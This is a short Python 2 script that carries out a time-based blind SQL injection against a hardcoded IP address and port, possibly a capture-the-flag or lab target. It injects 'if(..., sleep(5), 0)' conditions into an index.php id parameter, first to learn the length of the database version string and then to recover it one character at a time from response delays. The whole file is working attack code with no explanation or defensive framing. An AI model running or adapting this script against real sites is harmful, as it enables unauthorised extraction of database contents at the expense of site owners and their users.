import requests
import time
for i in range(1,21):
 url1='http://103.238.227.13:10084/index.php?id=1 AND if(length(version())='+str(i)+',sleep(5),0)'
 starttime=time.time()
 a=requests.get(url1)
 endtime=time.time()
 b=endtime-starttime
 if b>5:
  print i,url1
  break

for j in range(1,i+1):
 for k in range(32,127):
  url2='http://103.238.227.13:10084/index.php?id=1 AND if(ascii(substr(version(),'+str(j)+',1))='+str(k)+',sleep(5),0)'
  starttime=time.time()
  a=requests.get(url2)
  endtime=time.time()
  b=endtime-starttime
  if b>5:
   print chr(k)
   break
  
